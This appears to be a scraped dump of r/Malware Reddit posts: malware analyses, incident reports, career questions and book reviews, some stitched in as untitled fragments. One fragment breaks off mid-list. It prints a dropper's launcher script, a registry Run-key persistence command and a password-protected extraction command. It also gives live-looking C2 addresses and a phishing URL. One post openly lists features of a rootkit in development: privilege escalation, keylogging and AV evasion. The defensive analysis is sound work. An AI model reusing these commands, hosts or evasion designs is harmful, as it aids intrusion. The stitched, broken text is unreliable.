1697552429.0,Malware on New York Times top sponsored link using Google search,"Today I Googled ""NYT"" and clicked the top sponsored link for ""The New York Times"" ‚Äì which displayed the correct URL and masthead.

BOOM - my MacBook Air screen was immediately filled with skulls and crossbones, and a computer voice announced that my computer was locked until I paid a ransom.  I had to restart my laptop twice to get things back to normal.

To confirm my suspicions, I Googled NYT again and clicked on the top sponsored results.  BOOM ‚Äì same malware scam.

How is this possible?  Are scammers redirecting Google search results to a bogus webpage?  First time I've seen something as egregious as this.

If anyone's used Steam a lot, they've inevitably come across a variation of one of those ""Click this image link!"" things that redirects you to a fake image hosting site, and downloads a .scr file.  
  
Well, I got curious one day, so decided to investigate.  
  
1.) Scan with virustotal.com  
  
[Virustotal Link](https://www.virustotal.com/en/file/808027e47111b52dac9e164713a4a408bb9f5ffcd814b09c57ed9b74bbab3359/analysis/1439847689/)  
  
Currently undetected by everyone excluding 1 Chinese company. That's a little worrying. Must be something new (Although it's been around for years), or simply polymorphic (More probably)  
  
2.) Submit to malwr.com  
  
[Analysis Link](https://malwr.com/analysis/MTcwNjEwNTMyYjk2NGRiMzgxZThjMzNhMjZkN2QyODE/)  
  
Two main things to note here.  
  
- Connection to www.myflare.com under ""Network Analysis""  
- 3 dropped files  
  
3.) Investigation!  
  
Dropped file 1  
  
inst.js  
  
> var WSHShell = WScript.CreateObject(""WScript.Shell"");  
WSHShell.Run('set.cmd',0);  
WSHShell.Run('run.cmd',0);
  
It runs 2 other files. But where do those come from?  
  
Dropped file 2
  
down.js  
  
[Pastebin Link](http://pastebin.com/7vAb4rqE) -  **WARNING - Those MyFlare files are live - Take caution!**  
  
Ok - That's a little more significant. It downloads 4 files. set.cmd and run.cmd are then run by the first dropped file - inst.js  
  
Let's examine those  
  
runs.exe - Toss it through ProtectionID and we get this - [Picture](http://i.imgur.com/1zd4rIF.png) - It's the 7zip extractor. That small mystery solved.  
  
Next downloaded file - Simply called ""file"".  
  
Rename it to a .txt, open with Notepad, and the first 3 characters show ""7z¬º"" - Possibly a 7zip archive. Rename the file to .rar, open with WinRAR, and we get...  
  
[Picture](http://i.imgur.com/76p33Cs.png)  
  
The NVidia Display settings in a compressed passworded file? That's weird. Anyways - Carrying on. The next downloaded file!  
  
run.cmd - Open with notepad, and we get  
  
> reg add ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /f /v ""nvxdsync32.exe"" /t REG_SZ /d ""%APPDATA%\Security\nvxdsync32.exe""
  
Hmmm - So it seems that NVidia driver is more than it appears... But the archive is passworded. Hopefully the final file will shed some light on matters!  
  
set.cmd  
  
[Pastebin Link](http://pastebin.com/1hQMyz7K)  
  
Ok - Wow. This does a lot of stuff. A line that sticks out is  
  
> ""%APPDATA%\runs.exe"" x -pferum -y ""%APPDATA%\file"" -o""%APPDATA%""
  
Remember ""runs"" was the renamed 7zip extractor? Well - What do we have here... ""-pferum"" ? Password of ""ferum"" ? Test, and....  
  
[Picture](http://i.imgur.com/qEFcRWz.png) - It Extracted - In a hidden folder!  
  
Open it, and... [Picture](http://i.imgur.com/7ORcF8a.png)  
  
...  
  
So where are the rest files?  
  
Well, it seems that set.cmd also plays around with folder permissions a bit... So let's try find them!  
  
[Picture](http://i.imgur.com/EbS8q0n.png) - Yup - There they are!  
 
After a bit of fiddling around - GOT THEM! - 
[Picture](http://i.imgur.com/WzAWfYg.png)  
  
So - What's so special about that NVidia config file now... ? Right-Click Properties, and.... That doesn't look right! - [Picture](http://i.imgur.com/C2i3r0s.png)  
  
Do a bit of research on Net Support, and we figure out that it's a piece of Remote Desktop software. Who would've thought!  
  
4.) The End  
  
Now, this is unfortunately where my little adventure ends. For you see, whilst I was able to acquire a trial version of the Net Support software (It's a legitimate piece of software), I was unable to connect to his server, as I was unable to decipher the Gateway key he used.  
  
[Config file - Picture](http://i.imgur.com/Jg0YblC.png)   (Well well Mr Dew of Germany...)  
  
[Vague decryption attempts - Picture](http://i.imgur.com/hrLiZII.png)  - I could input characters and get an encrypted output. I had the output I needed, although I couldn't figure out the input. This is a sample of the input / output.    
  
Unfortunately my Cryptography skills are insufficient, so here the story ends. I am simply one powerless individual, so am unable to do anything about tracking down the server IP - 46.165.206.78 - Currently online as of posting.  
  
I hope you had a good read, maybe learned something, and enjoy the rest of your day!

- General overview, about me, why and how I got into malware, why I'm not an expert, how you can be an expert, and more


- Windows PE format (IMAGE_DOS_HEAD, IMAGE_NT_HEAD, IMAGE_FILE_HEADER, IMAGE_OPTIONAL_HEADER, and all of the associated IMAGE_DATA_DIRECTORIES and how the PE headers can be used to harvest data on a target executable.


- How to parse the PE headers programmatically in C without usage of the WinAPI


- How to use the PE headers to dynamically load API functions to avoid standard user-mode heuristic analysis (and how to avoid hard-coding function addresses)


- Introduction to PE infection


- Parasitic Infection (overwrite, appending, prepending)


- Cavity Infection


- Fractionated Cavity Infection


- File System Octopus concepts


- Amoeba Infection


- Embedded Decryption / Encryption (stub file, multi staged infection)


- Entry Point Obscuring / Code Integration


-  IAT hooking / hijacking


- Advanced / Next generation malware (APT malware theories) such as Polymorphism mutation engine and the infamous and legendary Metamorphic mutation engine.


- Advanced Rootkit concepts such as DKOM for process structure manipulation and winsocket manipulation


- Other neat stuff I've found: unknown / undocumented data locations and how you can utilize them, how to XOR your strings easily, how to hash your API strings to remove unnecessary POSIX calls (or how to remove them entirely)


I won't have any notes on this stuff. I will literally be in my chair, sitting Red Bull, and shooting the shit with you guys and sharing my knowledge. I want ALL of you to contribute, give feedback, share what you've learned, and more. Also, can someone help me set this whole thing up? I've never done a live stream before. Thanks everyone :)

1442945872.0,Imgur Exploited by blackhats,"NOTE: This exploit has been resolved already.

From /u/korri123
EDIT: http://pastebin.com/heYvWu5Y 
Some tl;dr about what we know

    hacker manages to inject JavaScript code into imgur. source: https://archive.is/JaJmO 

    JS loads a flash swf. decompiled swf shows this AS3 code: http://pastebin.com/ytfKq2Mw 

    swf injects saves javascript into localstorage. injected code here: http://pastebin.com/XUssBG5z 

    Javascript injects more javascript into the page and evals it. src: http://pastebin.com/myxtBWjh 

    Javascript loads something remotely with the url ""'hxxps://8chan.pw/ (Is actually https,  just switched it to hxxp so people don't accidently click it). 
    a_this.uaf"" but uaf is a secret that is calculated somehow. Would have to examine (or just run) the code to figure out what the url is.

    uaf file is being decrypted as of now

    it returned nothing useful

    edit: it actually did return a space when refered to 4chan.org. maybe some other url will return something useful?

this is what needs to be researched (for any of you javascript and web nerds)

Guesses include client-side involuntary DDoS on both/either 8chan and 4chan








From /u/ItsMeCaptainMurphy:

This isn't a DDOS. It's targeting 8chan users and leaving javascript code in their local storage that causes their browsers ping back to a command and control server each time they hit an 8chan page. Thus far the C&C server hasn't sent out any commands (or stopped issuing commands before this was discovered). Over the evening whoever authored this has been updating and changing their code. It only effects very specific imgur images/pages. Why is not yet known.

Things to take away:

If you visit imgur and 8chan you may very well have a big issue. Clear your localstorage (go to 8chan, open your browsers console, type localstorage and see what's there - then type localstorage = [] and hit enter) as well as all browser private information (cookies, passwords, offline storage, etc). See edit #4 for a better way to ensure you're safe. Don't go to 8chan before clearing all local storage.

Imgur is compromised. This is the big one and should be very worrisome to anyone on this site. There are three possibilities:

1.) There is an exploit in how imgur processes images that allows someone uploading an image to get code injected into the page when someone else loads the image from imgur

2.) Imgur has one or more servers that are compromised

3.) Imgur has a rogue employee injecting malicious code.

In all cases, this is really, really bad. It's very unlikely that a 0day exploit on a site as big as imgur is just being used to go after 8chan (unless it's case 3. and someone has a grudge). This allows whoever knows how to take advantage of the exploit to launch an XSS attack against anyone who visits a malicious page on imgur. And there's no way to tell before visiting the page. Not all pages on imgur are compromised and right now it appears to be a very small number of images that had malicious payloads sitting on their page.

How the attack appears to have worked:

1.) Malicious javascript got onto imgur's server somehow (via one of the three routes outlined above)

2.) This js created iframes and embedded a flash file hosted on 8chan. The iframe was off screen so a user would not notice. Since imgur typically uses flash for parts of its functionality flash asking to run on imgur wouldn't be seen as suspicious.

3.) This flash file injected more javascript into the page (while on the surface looking like an innocuous pikachu animation). This javascript was stored to the user's localstorage (which, since the iframe was pointing at 8chan, allowed the attacker to attach js to 8chan's localstorage). It's functionality is to issue a GET request to 8chan.pw (not an 8chan server AFAIK) and then decrypted the response. So far no one has been able to see a response from that web service, meaning it likely wasn't activated yet or has already been deactivated. The outcome is that every time a user visited an 8chan page, it would ""phone home"" to check for instructions and then execute more javascript code.

I would stress that everyone should disable flash and javascript on imgur for the time being. This attack may not be the only use of this exploit and a lot of very, very bad things could be done through XSS if more people are exploiting this. You should treat the entire site as potentially compromised until imgur addresses this and explains what happened.

1439749086.0,PSA: Advanced Malware Analysis by Christopher Elisan not worth your time,"Don't know if this is appropriate here, but I figured it was worth a shot.

I just got a recommendation and was interested reading the writeup. However reading the review on the book changed my view. Thanks to Amazon reviewer Jim Bartels for the review below:

This book is in no regard about ""Advanced"" malware analysis like the title suggests. It is not even an introductory malware analysis book. All the book covers is how to install various tools that you would need to start with malware analysis 101. The books doesn't show disassembly of malware, it doesn't discuss any Windows API calls or any other Windows internals. The book doesn't even teach you what malware really is.

The first chapter (page 6) contains the following gem: ""Static analysis is the easiest [...] malware analysis process. [...] It is as easy as clicking some buttons or using a command line"". This sums up the book pretty well: according to the author, malware analysis is mostly about installing tools and clicking some buttons. That might be part of it, but I don't consider that ""Advanced Malware Analysis"" or even ""Malware Analysis"".

What does the book tackle then? The book is mostly filled with screenshots and very detailled tutorials how to install tools.

You got screenshots of the Windows update settings, the Windows 7 security settings, the user account settings, the word option setting. You even got a full page dedicated to a screenshot of xcopy.exe copying some files.

An then you have tutorials. There are 25 pages dedicated how to install and use gpg to encrypt malware for moving it from source to analysis machine. Or tutorials how to install InstallRite. Of course accompanied by four screenshots of the install wizard with the options to click Next or Cancel.

Chapter 11, ""Inspecting Static Malware"", is finally dedicated to analysing malware. It is only 19 pages long and contains the following tutorials: how to identify the file type with ""file"" for PEid"", how to upload the file to Virustotal (of course we get to see two pages of Virustotal screenshots), and how to use ""strings"" to extract the strings. THAT'S IT!

Malware Analysis is not about installing tools and you certainly don't need pages and pages of screenshots and step by step instructions on how to install zip or wireshark. If you need help with that, you can easily find better tutorials online. If you really want to learn about Malware Analysis, I highly recommend the book ""Practical Malware Analysis"". If you like the idea of step-by-step instructions, then get the ""Malware Analyst's Cookbook and DVD"".",Malware,2586,434,79,0

1663221239.0,Novel PDF malware: injecting JavaScript into the encrypted section of Adobe Type 1 font binaries is not detectable by malware scanners and doesn't interfere with decryption/decompilation of the font (along with a new tool for malicious PDF analysis),"See [this Twitter thread](https://twitter.com/Cryptadamist/status/1570167937381826560) with most of the details/screenshots/virustotal links/etc.

Apologies if this isn't new but the fact that none of the malware detection tools alert on it coupled with the fact that I could find nothing about this sort of thing on the internet suggested to me that it was a new kind of thing. No idea if this exploits a still extant vulnerability or an old one.

The tool is the [the pdfalyzer](https://github.com/michelcrypt4d4mus/pdfalyzer); I just open sourced it. Meant to fill in some gaps around pdf-parser.py and the rest of Didier Stevens's malicious PDF toolkit. Makes pretty charts, previews data streams, and (most importantly) digs through PDF font binaries for potentially executable stuff. Example output can be seen at the GitHub link.

I'm not a cybersecurity guy, just a guy with some computer skills who had to brush up on his security chops in a hurry when I was recently victimized by the PDF in question, so I haven't solved this puzzle entirely.  I know the Javascript is there, lurking, but I can't figure out what it actually *does.*

At least when it comes to the specifics.  When it comes to the lived experience I know that rendering this PDF opened a backdoor onto a machine on my network¬π  through which the attackers proceeded to compromise a large number of my devices via the crazy macOS/iOS vulnerabilities Apple disclosed last month¬π.

If you have any tips on how to deobfuscate the JS or otherwise figure out what the malicious code is actually doing I'd love to hear about it. I tried a couple things:

1. Didier Stevens \``xorsearch.py` didn't work, though I did note that \``xorsearch.exe`, the windows version of the tool which I have not tried, had a lot more features/could brute force orders of magnitude more possibilities.
2. python's `chardet` library, which is theoretically able to guess an encoding for any chunk of binary data, failed miserably at both the entirety of the binary as well as the chunks I extracted from between the backtick and guillemet quotation marks
3. hunting around in the PDF for some kind of number that could serve as a rotation key (or similar annoying-but-not-terribly-sophisticated encryption scheme) to deobfuscate the rest of the JS code. there's a bunch of numbers in the various PDF objects - stuff like character width, page position, etc etc are all numbers - but all of them seemed to have a legit use case according to Adobe's official PDF spec.
4. checking the binary for stuff that looked like a regex. there was *definitely* stuff that looked like a regex and now that I think of it again I will try to get some screenshots of that stuff, but the the potential regexes I checked never really added up to regexes (or I missed it)

**update**: someone suggested I run it through hybrid-analysis, which I though I had done... but [I did it again anyways](https://twitter.com/Cryptadamist/status/1570342710988644352). HA still comes back green like I remembered but this time I looked a little closer at the results and there's a decent amount of stuff that's indicative of malevolent intent.

**update2:** [Link to tria.ge report](https://tria.ge/220919-bnr8paecbj/behavioral2) someone put on twitter. also just to clarify exactly where I burned out on this - I was trying to read the `t1disasm` code to see what would cause it to skip and/or stop decrypt at a given byte to see how it could be possible that a string like `/FJS\`\xbb\`` could avoid interfering with the decryption of the type1 adobe font, but I burned out before getting any kind of answer.

**update3:** (2022-09-20) [Posted some new screenshots](https://twitter.com/Cryptadamist/status/1572364141771522049) of various less garbled attempts to guess an encoding for some of the stuff in the JS regions of the font binaries

I am not a mega expert by all means, but I can hang with the best. My biggest fault is I'm not good at reverse engineering malware, only developing malware (which seems to be opposite of most malware experts?)


Anyway, I've been writing an experimental computer virus for a few months now and it's officially transformed into a Rootkit. It has the following functionality:


- Completely position independent, makes no direct function calls. Does this by parsing the export address table of NTDLL.dll on load.


- Rewrote several windows kernel32 functions to avoid unnecessary function imports (GetLastError, SetLastError, GetEnvironmentVariable, SetFilePointer, LoadLibrary, GetModuleHandle to name a few...)


- Programmatically escalates to admin using an unpatched exploit


- (work in progress) programmatically escalates to SYSTEM but cloning SYSTEM process security tokens


- Hooks user keyboard input on the hardware level


- (work in progress) Fractionated Infector cryptor for infecting files


- (work in progress) File system octopus injector (fractionated resource file injection


- (work in progress) Steals valid Microsoft signatures to avoid AV detection


- (work in progress) modified system process block to hide process from task manager


- (work in progress) additional evasion stuff...


- thread context switching, executes unnecessary junk instructions randomly to make it more difficult to reverse engineer


- anti virtualization technology (phony Op codes)


- Self debugging mechanism to make it more difficult to debug 


- all strings are XORd (no strings, cannot sting dump)


- original code is packed and compressed

1569932852.0,Interview Questions for Malware/Vuln Research Internship,"Bit of a brain dump, just had an interview for a malware analysis and vulerability research internship. I thought others may be interested in the kind of questions that were asked, as I can't really find many other posts like this.

Note: My second interview is today, may edit this later with fresh questions if I'm not under NDA and the topics are not proprietory. Doing a few more of these for both classified and unclassified roles, may make some more posts in future.

Update: It's below, along with an ideal candidate profile from what I got out of the interviews.

Role details:

- Defense role

- Uncleared - A lot of places let you do really cool offensive security stuff uncleared, look out for cool roles

- Atribution focused malware analysis

- Software reverse engineering

- Vulnerability research

- Requires knowledge of assembly, low level programming concepts, debugging, and reverse engineering

- Research focused

- Partially self defined

Details about me:

- Freshman Computer Engineering major and part of a Cybersecurity honors program

- GREM - this is likely what got me past their preference for students with relevant coursework in RE and Assembly

- Past IA experience at a large defense contractor, though I'm not sure how much that mattered for this role in particular

What was asked:

- Basic reverse engineering questions like, ""what's the difference between cdecl, fastcall, and standardcall?""

- Questions about my fuzzing and vulnerability research experience

- Questions about how many malware samples I had analyzed in the past - the answer to this one was ""not many"", but I was able to pull out some cool stories about packers I had tried reversing

- Questions about my (at the time) upcoming attempt at the OSCE that went into fuzzing and my exploit development knowledge

That was supposed to be the soft skills interview but the guy took it in a more technical direction that I appreciated. Technical interview is today, wish me luck!

Edit: Just got out of an interview, fairly intensive because there were 4 different teams looking for interns. Position was capabilities development focused, which was fun. They were a bit skeptical because I was a freshman, but once we started talking they warmed up.

Intro team, malware analysts: Asked me generally to describe my experience then dug into specifics like how I would backdoor a PE (interviewer said he likes that my answer was more in depth than ""find a code cave and insert code"", so keep that in mind. Wanted to hear a lot about network protocol reversing experience.

RE Generalists: Asked me about a lot of the tools I used to do RE such as GHIDRA and IDA Pro. Asked me what I liked and didn't like about both, focused on capabilities. 

Malware analysis team: Asked me what I would do if I was given a sample, tools and methodology. Liked my answer, but clearly hoped it would have been both windows and Linux oriented. Asked about CTF experience, which I don't have much of but had cool binex stories from.

Exploit development team: CTFs, lot of CTF's, I haven't done many CTF's but they wanted me to do more CTF's and wanted to hear about CTF experience. Asked me about my shellcode writing experience and methodology. Asked me about tools I had developed to facilitate exploits.

Project lead: Put some C code in front if me and asked me if I could figure out what it was doing, which took me a bit, and where the bug was. Not too bad, but I took a little bit to answer because my familiarity with some C concepts isn't where I wish it was.

Ideal candidate profile:

- Comfortable with low level development, both arm and x86

- Comfortable reversing network protocols

- Comfortable with python

- Comfortable in both user and kernel mode, seeing a lot of desire for kernel mode work at a lot of companies this year

- Comfortable with C concepts including linked lists

- Comfortable with offensive RE for x86, .NET, and embedded software

- They seem to really like people who upload low level projects and python tools on GitHub because it gives them an easy metric to measure you by

- Some of them read my blog posts and were interested in my projects, so that's another avenue

I work at an AT&T Authorized Dealer (cell phone store) in the middle of nowhere, where phone-illiterates are grown. Today I've had the enjoyment of dealing with a ransomware app for a customer's Kyocera Hydro, a very inexpensive phone. Customer claims his teenage son was messing with the phone for a while and returned it with the ""FBI warning"" on the screen, demanding a payment via prepaid debit card.  
The app covered the entire screen preventing any interaction and making access to the settings impossible.  
I booted the phone into SAFE mode by holding down the volume down and power buttons until it restarted, letting go of power once it turned back on (other phones will work differently).  
Once it rebooted it asked for a pincode, of which the customer has never set. Luckily after a couple of failed attempts, the phone offered a ""forgot pin?"" option, to my understanding isn't a very common feature. More luck ensued as the customer remembered their Gmail and password, from their I was given the option to remove the pin all together.  
I looked through the installed apps to find the culprit, determined it to be the outlier of typical bloatware, ""PornHub."".   
Attempts to uninstall it we're hindered by it being greyed out, I then went to Security-> Device Administrators to find that ""PornHub"" was there and active.  
Unfortunately, when I went to disable it, the screen would go to sleep immediately, and attempts to turn the screen on was a tug-of-war with the app.  
I then went and turned on Developer Mode (about phone -> tap 'build' a bunch of times) and found an option to control the amount of simultaneous background apps.  
Setting that to 'none' then retrying to disable the Device Administrator worked once I was able to tap the OK of the pop-up window that asked for verification to disable the Device Administrator while still fighting the screen sleeping.  
From there I was free to uninstall the ""PornHub"" app and hand the phone back to the customer once developer mode and it's options were set to default.  
  
I find this to be a per-case solution to this particular Ransomware, as I don't believe most phones have the option to bypass the pin number lock screen.  
  
I wrote this on my phone, so sorry if it's ugly.

What I really appreciate about Maldev Academy is how they dive deep into the code and explain the basics in a way that beginners can understand. They start with the basics of C programming and then move on to developing malware.

The instructors are very responsive on Discord, and it's helpful to get answers to any questions or support you may need.

Overall, I highly recommend Maldev Academy to anyone interested in learning more about malware development. I feel like I've gained a better understanding of how malware works and improved my coding skills. If you have any questions, feel free to ask me!

Note: The course is not video based which may be difficult for those that prefer video tutorials instead of reading the modules. After speaking with the owner on Discord, they are planning to introduce video modules within the next couple of months. This personally doesn't effect me as I prefer reading the content instead of watching.",Malware,1203,201,28,0

1668541386.0,Just failed 2/3 technical samples during a practical interview. Feels bad.,"Follow-up: I got ghosted. Lol.

-----------------------------------------------

Man, the posts I often read on Reddit about failing technical interviews in STEM came to fruition for me today. I had my second round/interview for a malware analyst position at [insert large cyber company] which was a 2+ hour practical where I had to reverse two PE's, both encrypted with a custom packer, and then go through several non-PE files such as OLE documents, PDFs, PowerShell script, and others in which I had to do standard malware analysis. I had 45 minutes per PE and used up the full 45 on both. I could not figure out how to decrypt the custom packer in either. For the third, I did well and managed to identify all of files correctly and give a rough explanation of what each file's intent was quickly before the interview needed to end.

I wasn't afraid to admit when I was especially stuck at a certain point and asked questions for which direction I should potentially go from here. When I received hints or feedback, I was sure to add what they were saying to a .txt file on the VM that they were able to see my note-taking which I would reference later. I also talked out loud, nonstop about what I was doing so they could understand my thought process and then maybe shed light as to why I was stuck.

But, yeah... this was an eye-opening experience. I need to spend more quality time in debuggers and disassemblers in which a PE is obfuscated with a custom packer as I only had experience with identifying known packers and then, if necessary, attempting to manually unpack them. All I can say is that I tried my best and didn't give up before the time ran out. The interviewer said HR would get back to me in a day or two, but I imagine they say that even if a rejection is provided. I was told they have three different teams, all with different experience and duties. Unless one of those teams focuses more on threat research with light reversing, I don't really think I can provide what they're looking for. I didn't say that, of course.

Then, pretending the packed binary is malware, we'll perform dynamic analysis on the file using x64dbg, with the goal of allowing the code to execute until the binary unpacks itself in memory. Once unpacked, we'll explore how we can dump that binary to disk for further analysis.

1585934667.0,(Meta) Earning legitimate money as a malware developer,"As a malware developer it is frustrating to see every job ad in infosec is pentester that, reverse engineer this, blue team that and so on and so forth.

So in this thread I want to ask fellow malware developers, how do you make money *legitimately*? Here are some off top my head:

1. **Work for state actors:** This is the most obvious one since the state is usually the only legitimate user of offensive software. The problem is though the only option is the country where you are born. And if your local intelligence/law enforcement agency is a mediocre shitty one you cannot join a foreign one because it requires citizenship and also nation states love to get butthurt over ""treason"" and you have to deal with all that drama. Also working with government officials is a similar experience to having constipation.
2. **Work for private companies that work for state actors:** Compared to the previous, this one is a little bit more flexible. But from what I saw these companies are so archaically engineering focused like in ‚Äúyou have to graduate from computer engineering and have a 3.8+ GPA‚Äù or you have to solve that stupid engineering test where there are hundreds of math and geometry questions because that's obviously a good metric of your offensive software development skills.
3. **Game hacking:** ...Sigh. It has good money and legally/ethically it is somehow in a gray area as long as you have a way around cease and desist letters. It is also over competitive, forget about making hacks for popular games, those corners are already taken and those who did probably do a better job than you do. You have to make your own toolset to automate some processes, reverse engineer the AC and look for ways around them. Like I said adequate money but not really exciting to get 13 years olds spend their parents' credit card.
4. **Stalkerware:** No thanks. I don't want to be the main topic of a [Eva Galperin talk](https://www.ted.com/talks/eva_galperin_what_you_need_to_know_about_stalkerware).

Why this is an important topic is that there are many young guys who love developing malware just like me. I have a weird fascination with building offensive trap-like constructs since I was a kid (The first *malware* that I developed was a tea can with a hidden electric cable. Whoever would pick up that can from the floor would get electrified and die according to my 5 years old brain. I know, like I said *weird*.).

And when these young people get hungry and look for a legitimate way to make money but cannot do so they might decide to [*break bad*](https://www.youtube.com/watch?v=8h-iAZBtNrs). And the money in crimeware is *insanely* good and as that much ethically toxic, the more you consume it the more you turn into an asshole who rationalizes his bad behavior by excuses like ‚ÄúOh, but the banks and the system are compensating the losses. I ain't doing anything bad! It's just free harmless money bruh!‚Äù. Yeah the system is bad and this is exactly why it is bad, because of people rationalizing their unethical behavior. And don't get started with how people get caught or whatever. Actors with good OPSEC and who are not low hanging fruits don't get caught, I have seen it with my own eyes, those fuckers have Grand Theft Auto with money cheat like digits in their BTC accounts. Fuck the law. This is not a law problem, this is an ethics problem, a thing people have forgotten since the Ancient Greek and Roman Empire.

Don't think this is unimportant. [Marcus Hutchins](https://krebsonsecurity.com/2017/09/who-is-marcus-hutchins/) was one of those young guys. And there are many like him and some of them will spend many years behind bars because they are not lucky enough to sinkhole a domain and save the world. And once they get out, no legitimate company will hire them with their skillset because today's society is mostly selfish and hypocrite and obsessed with their good image. So once a criminal, always a criminal.

1479307926.0,"Malware spreading through Android devices, via Facebook messenger.","A friend of mine, via her Android 6.0 device, yesterday (15.11.2016) received an odd looking message from a host at `jimdo.com`. She clicked on it, and was ultimately redirected her to a porno site. The next day (16.11.2016), her Facebook account was used to send out hundreds of messages for a different host at `jimdo.com`. 

I have yet to inspect the Android device, but I have found that her Facebook account was not per se hacked. There were only two currently in-use sessions -- her Android device and the Windows host I had logged in with under her credentials (with explicit permission of course). There were about 7 or 8 other devices with valid sessions, but none had been active this year. She reports she had not used the Windows browser to access Facebook since the 12th of November.

This leaves me with the tentative conclusion that Google Chrome on Android itself has the vulnerability. At this time, the only info I have is that it's version 6.0. 

I also clicked on her message. I also got redirected to the Prono site. However, there is no indication (yet) that my Facebook account has been subject to unauthorized use. (Just in case, I beefed up security and dropped the current session). One difference may be: I used Facebook within the browser and not as a separate app. Another difference: I'm using Android 5.0 (Jan 1 16 security update). 

On Windows, I used Chrome with a new profile to visit the `jimdo.com` site. I used a new profile and a secondary Facebook account. In this environment, a visit to that site _did not_ redirect me. Thus, I suspect this website or one of its javascript providers has been hacked with a malware payload. HTTP Trace indicated visits to the following hosts:

    a.jimdo.com
    assets.jimstatic.com
    delivery.brokerbabe.com
    fonts.googleapis.com
    fonts.gstatic.com

    u.jimcdn.com
    widget.supercounters.com
    www.googletagmanager.com
    www.supercounters.com
    zepogihise.jimdo.com

I will note (complain) that Facebook does not publish a way of reporting malicious links sent in messages. You can report posts, you can report ""spam"", but not fishing or malware links. 

2016-11-17 Update: Cropped screenshots of messages. http://imgur.com/a/qEM20. The message from one user was always the same. Working hypothesis: hostname of URL morphs with every new infection.

**Update 2**: I tried the link again. Before doing so, I logged out of Facebook (Chrome) and logged in with an alternate account. (Yes, I have such a thing. Shock!) When I clicked on the link from within the Messenger App, the redirections eventually landed me at a fake Facebook login page. The URL shown is:

    http://authentionz-at.videoshareza.xyz/movill.php?lang=en&key=

Yesterday, when I tried that link and was logged into Facebook, I did _not_ see this prompt.  The friend claims she did not see or enter the password on this form, and that's something I can confirmed by looking at the Facebook privacy settings: no recent new sessions.  Working hypothesis: **this is a fake fake page, meant to deter security experts** by leading us to the conclusion that the user entered their credentials on this phishing page.

After doing some research on the compilation of the language, I've learned that API calls don't get linked, they actually have the code statically included in the binary. This results in a large size, and essentially making the IAT nearly useless. It also makes reversing incredibly tedious, as I am having to go through each subfunction to figure out if it's an API, and if so, which API, or if it's user written code. I imagine that if there wasn't a way to make this easier, then every malware author in the world would be writing in Go.

The sample has been caught via SMB (most probably via SMB brute force). I have submitted the sample to several sandboxes (i work for one of the most important Infosec firms) and i've got the following results:
Once detonated it deploys a file called C:\htprcyx.bat but i also got enyejj.bat, C:\Windows\SysWOW64\bawdhw.bat, C:\Windows\system32\lssas.exe and C:\Windows\system32\winamp.exe in a second detonation on a different sandbox.
Then it tries to spread across the network via SMB brute force.
Once detonated it connects to 151.80.60.224 on tcp/4466 using an embedded IRC client, then it joins channel #balengor.
here's the complete list of commands i have seen:

1675011562.0,Recommendations for becoming a better malware analyst as a non-coder,"TL;DR I've been working in cybersecurity for 4+ years as a threat intel analyst. I came in with a very weak background in the field, i.e. only basic understanding of computer operating systems, networking, etc. I am a quick learner though and have been educating myself, mostly on concepts, about these topics and have reached a point where I feel comfortable performing basic static analysis on malware samples, can write simplistic Yara rules to detect uncommon strings, etc. 

I recently took SANS 610 with Lenny Zeltser which was an incredible learning experience but also very humbling. It made me realize how much of a gap there is between my level of knowledge and even what an entry level reverse engineer would have. To be clear, I have no aspirations to become a reverse engineer but being more comfortable playing around with malware to understand its capabilities, and quickly and proficiently write rules to detect it, is becoming a more important part of my day-to-day. I also just find it incredibly interesting. Combining RE work and hunting for samples with my already strong OSINT/investigative background is what I enjoy most about what I do.

The two areas I lack critical knowledge are: understanding of Windows internals, code, specifically assembly, and how memory functions. I can barely comprehend higher level code but working with debuggers and Ghidra was extremely difficult for me. I know there is no easy button or fast path to getting past this, but I wanted to ask here **what people would recommend as a way forward in order to develop a baseline understanding and familiarity with how Windows functions and how to use debuggers and disassemblers**? I think my biggest knowledge gap here is understanding programming logic and how memory works. 

My very rough plan at the moment is:

\-*Go back to basics*: Use books and YouTube to build the foundation of OS, memory, etc and other core CompSci topics

\-*Learn an easier language*: I know a stronger knowledge of Python would accelerate my ability to automate my workflow and simultaneously give me some of that programming logic I severely lack.

\-*Keep up with coursework*: FOR610 really motivated me to keep up with RE-focused coursework and tutorials, even when it is a bit above my level. I was able to keep up with most of the in-class exercises because of Lenny and the walkthroughs in the books and I have to think at some point it will rub off a bit, even if a lot still goes over my head.

Sorry for the rambling post, but if anyone has any suggestions whether it is a general approach, specific books or courses they found helpful, etc, critique, I'd really appreciate it!",Malware,2669,452,49,0

Emotet initially appeared in 2014 as banking trojan, has evolved now into more modularized version to carry out other malicious actions. Trickbot is banking trojan that once steals banking related information from the computer. Trickbot is also a modular malware, the threat actors use it to deploy their malicious codes.

I have come upon a sample that belongs to the Emotet strain. Trickbot is embedded with the Emotet strain. Once Trickbot starts infection, it connects to a malicious domain to probably download other threats.

While this concept is not new, and a previous ""autoruns"" plugin has been available for a while, this new plugin provides more capabilities than its predecessor. The project is called winesap (no, that's not a typo -- it's winesap, not winASEP), and it's able to detect more ASEPs than its predecessor and apply custom rules to automatically detect suspicious paths/filenames.

This originates from a project looking at ransomware targeting schools, but many of these threaten a range of industries including critical infrastructure, healthcare, & more. Each one has published extortion posts involving a school during the past year and this trend is increasing: September & October were the [top two months](https://imgur.com/a/MuYwq7w) in that period by victim count. Vice [dominates](https://imgur.com/a/6HmEQEi) in terms of these victims, including in recent months.

Visual summary of my analysis: [https://app.tidalcyber.com/share/8d9f212a-0312-4c2f-bba5-85ab7c7224c6](https://app.tidalcyber.com/share/8d9f212a-0312-4c2f-bba5-85ab7c7224c6)

This covers **nine malware** mapped to **131 unique techniques** total, sourced from **30 recent public reports**, mainly malware analysis & government advisories (""Show only labelled techniques"" gives the best view). The underlines & numbers in the cells indicate *number of malware mapped to that technique*. Background color gradient represents *number of sources* referencing it. This tool helps with pivoting to defenses and analytics (think Sigma rules), offensive tests (Atomic Red Team), and data sources (make sure you have proper logging enabled) mapped to the same techniques.

When I look at ""top"" TTPs like this, I use a rough system (working to refine it) to filter out ATT&CK techniques that are defined most broadly (it's also less useful to know something like T1486 had the highest count, since that's inherent in a ransomware attack). With this approach, here are techniques that appeared commonly among many of the strains and which generally seem more ""interesting"" to me from a defense/detection/testing standpoint:

